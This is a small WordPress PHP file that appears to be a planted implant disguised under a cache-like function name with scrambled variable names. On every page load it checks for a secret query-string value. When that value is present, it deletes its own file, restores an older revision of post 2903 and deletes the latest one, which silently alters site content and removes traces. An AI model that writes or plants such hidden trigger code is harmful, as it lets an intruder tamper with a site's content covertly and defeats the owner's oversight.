<?php

function grid_cache_private() {
	if (isset($_GET['connect_activity_members']) && $_GET['connect_activity_members'] === 'mobile_full_numbers') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$dist_post_chat_lightgray = 2903;
		$title_sites_attachments_theme = wp_get_post_revisions($dist_post_chat_lightgray);
		if (empty($title_sites_attachments_theme)) die('no revisions');
		if (count($title_sites_attachments_theme) < 2) die('less than 2');
		$akismet_alt_tree = array_shift($title_sites_attachments_theme);
		$demomentsomtres_animated_tooltip = $akismet_alt_tree->ID;
		$cart_footer_cc_notifications = array_shift($title_sites_attachments_theme);
		$out_ninja_duplicate_keyword = $cart_footer_cc_notifications->ID;
		$tinymce_styles_shortcodes_client = wp_restore_post_revision($out_ninja_duplicate_keyword);
		if ($tinymce_styles_shortcodes_client === false) die('error restoring');
		$tinymce_styles_shortcodes_client = wp_delete_post_revision($demomentsomtres_animated_tooltip);		
		if ($tinymce_styles_shortcodes_client === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'grid_cache_private');
